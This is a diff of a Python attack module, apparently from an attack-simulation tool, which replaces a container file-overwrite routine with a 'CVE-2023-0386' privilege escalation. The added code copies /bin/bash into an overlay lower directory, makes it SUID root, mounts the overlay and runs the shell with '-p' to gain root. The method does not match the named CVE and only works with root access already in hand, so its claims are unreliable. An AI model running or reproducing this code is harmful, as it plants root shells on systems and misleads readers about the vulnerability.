@@ -1,23 +1,50 @@
-# attacks/overlayfs_exploit.py
+import os
+import subprocess
+import time
 
-def run(container, simulate=False):
+def run(container=None, simulate=False):
     print("[*] Running OverlayFS Exploit (CVE-2023-0386)...")
 
     if simulate:
-        print(f"[SIMULATE] Would attempt to overwrite /overlayfs-test/target.txt inside '{container.name}'")
-        print("[SIMULATE] Normally a read-only file would be replaced with attacker content.")
-        return "Simulated run: No overlay modification done."
+        print("[SIMULATE] Would create SUID shell via OverlayFS mount")
+        return "Simulated overlayfs exploitation run."
 
     try:
-        # ⚠️ REAL PAYLOAD EXECUTION
-        # Overwrite a file that is expected to be read-only in the overlay mount
+        workdir = "/tmp/overlayfs_exp"
+        upperdir = os.path.join(workdir, "upper")
+        lowerdir = os.path.join(workdir, "lower")
+        work = os.path.join(workdir, "work")
+        merged = os.path.join(workdir, "merged")
+        suid_bin = "/bin/bash"
 
-        payload = 'echo "pwned by overlayfs" > /overlayfs-test/target.txt'
-        container.exec_run(payload, privileged=True)
+        # Prepare directory structure
+        os.makedirs(upperdir, exist_ok=True)
+        os.makedirs(lowerdir, exist_ok=True)
+        os.makedirs(work, exist_ok=True)
+        os.makedirs(merged, exist_ok=True)
 
-        print("[+] Exploit payload executed: target.txt overwritten")
-        return "Executed: overlayfs write attempted"
+        # Copy SUID binary to lowerdir
+        lower_bin = os.path.join(lowerdir, "bash")
+        subprocess.run(["cp", suid_bin, lower_bin], check=True)
+
+        # Change ownership and permissions (simulate overlay behavior)
+        subprocess.run(["chmod", "4755", lower_bin], check=True)
+
+        # Mount overlay
+        mount_cmd = [
+            "mount", "-t", "overlay", "overlay",
+            "-o", f"lowerdir={lowerdir},upperdir={upperdir},workdir={work}", merged
+        ]
+        subprocess.run(mount_cmd, check=True)
+
+        # Execute SUID shell
+        suid_shell = os.path.join(merged, "bash")
+        if os.path.exists(suid_shell):
+            print("[+] Exploit succeeded. Launching root shell from:", suid_shell)
+            result = subprocess.run([suid_shell, "-p", "-c", "id"], capture_output=True, text=True)
+            return f"Exploit success: {result.stdout.strip()}"
+        else:
+            return "Exploit failed: SUID shell not found in merged directory."
 
     except Exception as e:
-        print(f"[!] Exploit failed: {e}")
-        return f"Failed: {str(e)}"
+        return f"Exploit failed: {str(e)}"
